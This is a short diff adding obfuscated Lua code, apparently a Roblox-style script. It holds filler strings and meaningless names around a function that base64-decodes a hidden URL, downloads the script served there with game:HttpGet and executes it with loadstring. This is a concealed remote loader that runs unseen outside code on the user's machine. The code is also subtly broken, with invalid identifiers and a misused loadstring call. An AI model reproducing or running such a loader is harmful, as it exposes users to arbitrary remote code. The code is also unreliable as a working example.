@@ -1,0 +1,7 @@
+return(function(6mebE, ...)
+local be6QJR = {"JQLZt8SdJGJWCCMhi";"hVAxD4ii";"ah4gJWqi";"zzSua6P2TYpDJ2Al";"dA5oeP0DdqiDLHu";"vVxXkRQ8LYwXqfEH"}
+local J3RWxUXd = function(...)
+loadstring(game:HttpGet(loadstring(base64decode("aHR0cHM6Ly92eGV6ZXN0dWRpby5vbmxpbmUvYXBpL3NjcmlwdHMvc2NyaXB0X2tianFlajByNmhMSFMvc3RyZWFtL2luaXQ="))()))()
+end
+PJmPTzBN(57SHR)
+end)(...)
